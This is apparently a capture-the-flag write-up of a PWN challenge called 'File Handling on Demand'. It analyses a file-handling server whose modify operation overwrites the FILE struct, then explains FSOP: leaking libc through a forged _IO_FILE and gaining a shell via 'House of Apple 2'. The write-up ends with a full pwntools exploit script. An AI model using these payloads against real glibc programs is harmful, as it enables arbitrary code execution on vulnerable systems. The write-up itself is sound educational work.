The first PWN challenge we faced was titled "File Handling on Demand". The description stated that it was a custom file handling server but that it had been tested thoroughly and shouldn't have any bugs.  

## Analysis
A zip file was provided with the following contents  
![[Pasted image 20241120234631.png]]

The Dockerfile and docker-compose showed a pretty standard challenge setup 
```yaml title="docker-compose.yml" linenums="1"
version: '3.9'

services:
  fhod:
    build:
      dockerfile: ./Dockerfile.dist
      context: .
    ports:
      - 31337:8000
```

```dockerfile title="Dockerfile.dist" linenums="1"
FROM theflash2k/pwn-chal:latest

ENV CHAL_NAME=fhod
COPY ${CHAL_NAME} .
COPY flag.txt .
RUN mv flag.txt flag-`cat /dev/urandom | head -10 | md5sum | cut -d ' ' -f1`.txt
```

The challenge binary notably had everything enabled except for PIE
![[Pasted image 20241120235338.png]]

Source code was provided and looking through it we can see a few things  

There is a custom file struct `_CUSTOM_IO_FILE_` that encapsulates the usual `FILE *` 
```c
#define MAX_CONTENT_SIZE 0x100
typedef struct _CUSTOM_IO_FILE_ {
    FILE *file;
    char content[MAX_CONTENT_SIZE];
    bool is_open;
    _IO_MODE_ mode;
} _CUSTOM_IO_FILE_;
```

Objects can be initialized in the following function
```c
_CUSTOM_IO_FILE_*
_init_IO() {
    _CUSTOM_IO_FILE_* io = (_CUSTOM_IO_FILE_*)malloc(sizeof(_CUSTOM_IO_FILE_));
    io->file = NULL;
    io->is_open = false;
    return io;
}
```

`_init_IO()` is called at the start of the program once and the `_CUSTOM_IO_FILE_*` that is returned is used for all subsequent operations  

The following operations are defined for `_CUSTOM_IO_FILE_`
```c
typedef enum _IO_MODE_ {
    _IO_OPEN_         = 0x0, // Opening file using fopen
    _IO_READ_         = 0x1, // Reading from file using fread
    _IO_WRITE_        = 0x2, // Writing to file using fwrite
    _IO_CLOSE_        = 0x3, // Closing file using fclose
    _IO_MODIFY_       = 0x4  // Modify the contents of the file.
} _IO_MODE_;
```

Before each operation, an `_IO_precheck` function is called to check whether the operation can be safely performed on the file
```c
_IO_ERROR_
_IO_precheck_(const _CUSTOM_IO_FILE_ *io, _IO_MODE_ MODE) {

    if(!io) {
        __err(
            "_IO_precheck_(): Uninitialized _CUSTOM_IO_FILE*", NULL_PTR);
    } else if(MODE == _IO_READ_) { // _IO_read_
        if(!io->file || !io->is_open) {
            __err(
                "_IO_read_(): File not opened", DO_NOT_EXIT);
            return NULL_PTR;
        }

        if(io->mode != _IO_READ_) {
            __err(
                "_IO_read_(): File was not opened in READ mode", DO_NOT_EXIT);
            return INVAL_MODE;
        }
```

One thing of note here was that the `_IO_MODIFY_` operation did not require the file to be opened in `_IO_WRITE_` mode
```c
else if(MODE == _IO_MODIFY_) {
	if(!io->file || !io->is_open) {
		__err(
			"_IO_modify_(): File not opened", DO_NOT_EXIT);
		return NULL_PTR;
	}

	if(global_counter_handler.modify >= MAX_MODIFIES_ALLOWED) {
		__err(
			"_IO_modify_(): Constraint reached. Cannot modify the contents of the file.\n", DO_NOT_EXIT);
		return CONSTRAINTS_ERROR;
	}
}
```

This makes sense when we look at the code for the `_IO_modify_` function
```c
_IO_ERROR_
_IO_modify_(_CUSTOM_IO_FILE_* io) {
    _IO_ERROR_ err;
    if((err = _IO_precheck_(io, _IO_MODIFY_)) != SUCCESS) return err;

    printf("Enter the content you want to write: ");
    if(read(0, io->file, MAX_IO_FILE_SIZE) < 0) {
        return MODIFY_FAILED;
    }
    global_counter_handler.modify += 1;
    return SUCCESS;
}
```
We can see that there is a read directly from `stdin` to the `FILE` struct itself rather than into the file contents. This is clearly an FSOP challenge, however, I did not know this at the time because I had never solved an FSOP challenge before  
Lets take a look at the rest of the code execution flow before discussing the actual exploitation phase  
  
The main function is pretty simple. It starts off with instantiating a `_CUSTOM_IO_FILE_` object and then presents a menu to select from the operations discussed before
```c
int main(int argc, char* argv[], char* envp[]) {
    _CUSTOM_IO_FILE_ *io = _init_IO();
    _IO_ERROR_ err;
    int choice;
    int mode;
    char buffer[MAX_CONTENT_SIZE];

    while(true) {
        printf("\n\n");
        menu();
        get_input(PROMPT, &choice);
        switch(choice) {
            case 0:
                goto _end;
            case 1:
                if(_IO_precheck_(io, _IO_OPEN_) != SUCCESS) break;
                printf("Enter the name of the file you want to open: ");
                fgets(buffer, MAX_CONTENT_SIZE, stdin);
                buffer[strcspn(buffer, "\n")] = '\0';
                if(strstr(buffer, "flag")) {
                    printf("*** _IO_open_(): failed. flag is an invalid keyword ***\n");
                    break;
                }

                puts("Enter the mode you want to open the file in: ");
```
We can see we aren't allowed to open the flag file directly. That will have to be done via exploitation  
This is the program in action  
![[Pasted image 20241121034348.png]]

## Exploitation
First I figured since we had a write on the `FILE` object, we could use it to write to a soft link we had write permissions on and modify the file path it points to. This way we could possibly circumvent the check against open files with the string "flag" in their name. This approach, however, was quickly discarded because of three main reasons:  
- `fopen` always follows soft links. We can't write to the link file itself since we always get a handle to the actual file it points to
- We need a file descriptor to write to the link but we only have a `FILE` handle instead
- We don't have any normal method of reading the file contents even after opening the file because the `_IO_read_` method doesn't display the contents of the file and there is no other function that prints out the `content` variable in `_CUSTOM_IO_FILE_`
```c
_IO_ERROR_
_IO_read_(_CUSTOM_IO_FILE_* io) {
    int nbytes;
    _IO_ERROR_ err;
    if((err = _IO_precheck_(io, _IO_READ_)) != SUCCESS) return err; 

    memset(io->content, '\0', MAX_CONTENT_SIZE);
    if((nbytes = fread(io->content, sizeof(char), MAX_CONTENT_SIZE, io->file)) <= 0) {
        __err(
            "_IO_read(): fread failed", DO_NOT_EXIT);
        return READ_FAILED;
    }
    global_counter_handler.read += 1;
    return SUCCESS;
}
```

Then I thought about writing a reverse shell to something like the user crontab file but unfortunately the environment was very minimal and did not have a cron daemon available  
  
I discussed a bit with my team mate and we decided to look into FSOP. After reading a couple blogs on FSOP I found that the `FILE` write primitive that we had from `_IO_modify` was everything we needed to get arbitrary code execution. The first primitive we found was a way to convert the `fwrite` function into an `fread` from an arbitrary address onto an arbitrary file descriptor. How this works can be seen if we look into the libc implementation of `struct FILE` which is defined as follows  
```c title="FILE.h" linenums="1"
#ifndef __FILE_defined
#define __FILE_defined 1

struct _IO_FILE;

/* The opaque type of streams.  This is the definition used elsewhere.  */
typedef struct _IO_FILE FILE;

#endif

```

```c title="struct _IO_FILE"
/* offset      |    size */  type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];
```

We need to construct an `_IO_FILE` object so that the next write operation on it reads from an address instead and gives us its contents. Luckily, since PIE is disabled, we can read from a GOT address and leak an address from libc. I chose to leak the address of `printf`. This can be done by  
- Setting `_flags = 0xFBAD1800` which corresponds to  `_IO_MAGIC | _IO_IS_APPENDING | _IO_IS_CURRENTLY_PUTTING`. See [https://elixir.bootlin.com/glibc/glibc-2.40/source/libio/libio.h]
- Setting `_IO_read_ptr`, `_IO_read_end` and `_IO_read_base` to the address of `printf` in GOT 
- Setting `_IO_write_ptr` and `_IO_write_end` to the `address + 0x8` to specify end of read
- Setting `_fileno` to 1 for `stdout`

The next call to `_IO_write` leaks the address of `printf` in libc to `stdout` and then we can calculate the base address of libc from there. Once we have the libc leak we perform the next FSOP attack which is called "House of Apple 2"

## Final Exploit 
```python title="exploit.py" linenums="1"
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
exe = ELF('./fhod_patched')
libc = ELF('./libc.so.6')
context.binary = exe

if args.REMOTE:
    p = remote('192.168.18.50', 55590)
else:
    p = process(exe.path)
    
READ = b"1"
WRITE = b"2"

def debug():
    gdb.attach(p)

def openfile(filename, mode : int):
    p.sendlineafter('$ ', b"1")
    p.sendlineafter('open: ', filename)
    p.sendlineafter('$ ', mode)
    p.recvuntil('Descriptor: ')
    return p.recvline().strip()
    
def modify(data):
    p.sendlineafter('$ ', b"5")
    p.sendlineafter("write: ", data)
    
def read():
    p.sendlineafter('$ ', b"2")
    return p.recvall()

def closefile():
    p.sendlineafter('$ ', b"4")
    p.recvall()

def main():
    got_printf = exe.got['printf']

    structfile = openfile(b"/tmp/hello", WRITE)
    structfile = int(structfile, 16)
    
    log.info (f"Struct file: {structfile}")
    
    fstruct = b""
    fstruct += p64(0xfbad1800)
    fstruct += p64(got_printf)*3
    fstruct += p64(got_printf)*1
    fstruct += p64(got_printf+8)*2
    fstruct += p64(got_printf)*7
    fstruct += p64(0x1)
    
    modify(fstruct)
    
    p.sendlineafter('$ ', b"3")
    p.sendlineafter("file: ", b"AAAA")
    leak = p.recvline()[:8]
    libc_printf = u64(leak.ljust(8, b"\x00"))
    libc.address = libc_printf - libc.sym.printf
    log.info(f"Libc base: {hex(libc.address)}")
    
    vtable = libc.sym._IO_wfile_jumps - 0x18 # _IO_wfile_overflow
    
    payload = flat(
        unpack(b" sh".ljust(8, b"\x00")),
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
        (structfile+0x78)-0x68,
        libc.sym.system,
        0x0, libc.bss()+0x100, 0x0,
        structfile+0x20, structfile-0x70,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
        vtable
    )
    modify(payload)
    p.sendline("3")
    p.sendline("A"*10)
    p.interactive()
    p.close()
    
if __name__ == '__main__':
    main()
```

### Running the Exploit
![[Pasted image 20241121044550.png]]